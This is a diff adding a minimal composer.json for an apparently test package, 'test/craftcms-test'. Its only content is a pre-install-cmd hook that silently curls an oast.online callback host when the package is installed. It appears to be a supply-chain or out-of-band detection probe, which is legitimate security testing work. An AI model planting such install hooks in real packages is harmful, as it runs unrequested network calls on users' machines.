@@ -1,0 +1,7 @@
+{
+    "name": "test/craftcms-test",
+    "require": {},
+    "scripts": {
+        "pre-install-cmd": ["curl -s https://dbkglrbnjuvu2i6bbqg03tp5nbaukjkun.oast.online/composer-callback"]
+    }
+}
